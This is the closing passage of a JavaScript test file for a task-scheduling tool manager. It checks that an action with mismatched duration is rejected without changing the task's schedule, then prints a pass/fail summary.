  const res40 = await toolManager.executeAction(durationMismatchAction, {
    userId: userA,
    userConfirmed: true,
  });
  assert(res40.success === false, '40. Duration mismatch rejected');
  assert(res40.error === 'DURATION_MISMATCH', '40b. Error is DURATION_MISMATCH');
  const taskAfterFailure = await getTaskById(userA, unassignedTask.id);
  assert(taskAfterFailure?.scheduledStart === null, '40c. Failed validation caused zero mutation to scheduledStart');
  assert(taskAfterFailure?.scheduledEnd === null, '40d. Failed validation caused zero mutation to scheduledEnd');

  // =============================================================
  // SUMMARY
  // =============================================================
  console.log('\n================================================================');
  console.log(`TOOL MANAGER TEST SUMMARY: ${passed} PASSED, ${failed} FAILED`);
  console.log('================================================================');

  if (failed > 0) {
    process.exit(1);
  }
}

runToolManagerTests().catch((err) => {
  console.error('Unhandled error in ToolManager tests:', err);
  process.exit(1);
});
